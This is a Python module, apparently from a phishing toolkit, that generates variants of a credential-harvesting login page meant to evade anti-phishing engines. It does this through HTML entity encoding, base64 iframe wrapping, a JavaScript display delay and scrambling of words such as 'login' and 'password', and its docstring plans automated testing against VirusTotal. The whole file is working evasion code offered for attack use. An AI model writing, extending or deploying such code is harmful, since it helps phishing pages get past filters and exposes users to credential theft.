# phish_detection_bypass.py

"""
Bypass detection systems used by anti-phishing engines
Implemented Techniques:
- HTML obfuscation
- Base64 encoding
- DOM manipulation and delays
- Keyword shuffling
- Content mimicry of legitimate sites

Future:
- Integration with machine learning to test against phish detection engines
- Auto-bypass testing loop with services like VirusTotal (if enabled)
- Adaptive mutation engine based on feedback
"""

import base64
import random
import string
import re
from bs4 import BeautifulSoup
from utils.logger import logger

# Config
BYPASS_METHODS = ["base64", "obfuscate_html", "inject_js_delay", "keyword_shuffle"]
SUSPICIOUS_KEYWORDS = ["login", "password", "secure", "account", "verify"]


def base64_encode_content(content: str) -> str:
    encoded = base64.b64encode(content.encode()).decode()
    return f'<iframe srcdoc="{encoded}" sandbox="allow-scripts allow-forms"></iframe>'


def obfuscate_html(content: str) -> str:
    obfuscated = ""
    for char in content:
        if char.isalpha():
            obfuscated += f"&#{ord(char)};"
        else:
            obfuscated += char
    return obfuscated


def inject_js_delay(content: str, delay=3000) -> str:
    soup = BeautifulSoup(content, "html.parser")
    script_tag = soup.new_tag("script")
    script_tag.string = f"setTimeout(function() {{ document.body.style.display = 'block'; }}, {delay}); document.body.style.display = 'none';"
    soup.body.insert(0, script_tag)
    return str(soup)


def shuffle_keywords(content: str) -> str:
    for keyword in SUSPICIOUS_KEYWORDS:
        jumbled = ''.join(random.sample(keyword, len(keyword)))
        content = content.replace(keyword, jumbled)
    return content


def generate_bypass_variants(html_code: str) -> dict:
    variants = {}
    if not html_code:
        return variants

    variants["original"] = html_code
    variants["base64"] = base64_encode_content(html_code)
    variants["obfuscated"] = obfuscate_html(html_code)
    variants["js_delay"] = inject_js_delay(html_code)
    variants["keyword_shuffle"] = shuffle_keywords(html_code)

    return variants


def apply_all_bypass_methods(html_code: str) -> str:
    try:
        html_code = obfuscate_html(html_code)
        html_code = inject_js_delay(html_code)
        html_code = shuffle_keywords(html_code)
        return html_code
    except Exception as e:
        logger.error(f"Bypass error: {e}")
        return html_code


if __name__ == "__main__":
    sample_html = """
    <html>
        <body>
            <form action="/login">
                <input name="username" />
                <input type="password" name="password" />
                <button>Login</button>
            </form>
        </body>
    </html>
    """
    logger.info("Generating anti-detection variants...")
    variants = generate_bypass_variants(sample_html)
    for k, v in variants.items():
        logger.info(f"Variant ({k}):\n{v[:200]}\n...")
